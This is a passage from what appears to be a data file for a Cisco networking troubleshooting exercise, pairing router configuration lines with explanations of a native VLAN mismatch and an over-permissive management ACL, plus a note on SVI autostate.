     [' encapsulation dot1Q 1 native','RtrA treats VLAN 1 as native while SwA sends VLAN 99 untagged, so the two ends disagree about untagged frames. Fix: interface g0/0.99 with encapsulation dot1Q 99 native, and remove g0/0.1.'],
     ['interface GigabitEthernet0/0.20',null],
     [' encapsulation dot1Q 20',null],
     [' ip address 10.1.20.1 255.255.255.0',null],
     ['RtrA# show running-config | include access-list',null],
     ['access-list 20 permit 10.1.20.0 0.0.0.255',null],
     ['access-list 20 permit 10.2.20.0 0.0.0.255',null,'10.2.20.0/24 is the Teachers subnet at Site B, and Teachers at both sites manage the network, so this entry belongs in ACL 20.'],
     ['access-list 20 permit 10.1.10.0 0.0.0.255','10.1.10.0/24 is the Students subnet. Management belongs to Teachers only, so this line opens SSH on RtrA to every Students PC. Fix: ip access-list standard 20, then no 30 (the line’s sequence number in show access-lists).']
   ]),

     ['The SVI is down/down','show vlan brief','Autostate holds the SVI down until its VLAN exists with an up port.'],
